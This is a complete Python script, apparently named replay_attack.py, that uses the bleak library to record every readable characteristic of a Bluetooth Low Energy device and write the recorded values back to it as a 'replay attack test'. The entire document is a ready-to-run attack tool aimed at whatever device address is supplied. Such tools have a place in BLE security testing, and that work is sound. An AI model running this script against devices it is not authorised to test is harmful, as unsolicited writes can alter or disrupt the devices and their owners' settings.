import asyncio
import json
import sys
from bleak import BleakClient

async def record_characteristics(address):
    data = {}
    try:
        async with BleakClient(address) as client:
            for service in client.services:
                for char in service.characteristics:
                    if 'read' in char.properties:
                        try:
                            val = await client.read_gatt_char(char.uuid)
                            data[str(char.uuid)] = val.hex()
                        except Exception:
                            data[str(char.uuid)] = None
    except Exception as e:
        print(f"Error during recording: {e}")
    return data

async def replay_characteristics(address, data):
    try:
        async with BleakClient(address) as client:
            for uuid, hexval in data.items():
                if hexval is None:
                    continue
                try:
                    await client.write_gatt_char(uuid, bytes.fromhex(hexval))
                    print(f"Replayed value to {uuid}")
                except Exception as e:
                    print(f"Error writing {uuid}: {e}")
    except Exception as e:
        print(f"Error during replay: {e}")

async def automatic_replay_test(address):
    print("Recording characteristics...")
    data = await record_characteristics(address)
    if not data:
        print("No data recorded")
        return
    with open('recorded_values.json', 'w') as f:
        json.dump(data, f, indent=2)
    print("Replaying recorded values...")
    await replay_characteristics(address, data)
    print("Replay attack test complete")

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: python replay_attack.py <device_address>")
        sys.exit(1)
    asyncio.run(automatic_replay_test(sys.argv[1]))
